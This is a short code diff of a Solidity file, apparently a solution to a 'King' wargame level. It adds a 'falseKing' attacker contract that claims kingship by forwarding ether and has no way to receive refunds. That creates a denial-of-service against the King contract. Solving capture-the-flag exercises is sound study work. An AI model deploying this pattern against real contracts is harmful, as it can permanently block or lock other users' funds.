@@ -25,17 +25,10 @@ contract King {
     }
 }
 
-/*
+
 contract falseKing{
-    King public king;
-    
-    uint256 public prize;
-    address public owner;
-
-    constructor(address _kingadrs) payable {
-        king = King(_kingadrs);
-        owner = msg.sender;
-        prize = msg.value;
+    function claimKingship(address payable _to) public payable{
+        (bool sent, ) = _to.call{value: msg.value}("");
+        require(sent, 'Failed to send value');
     }
-
-}*/
+}
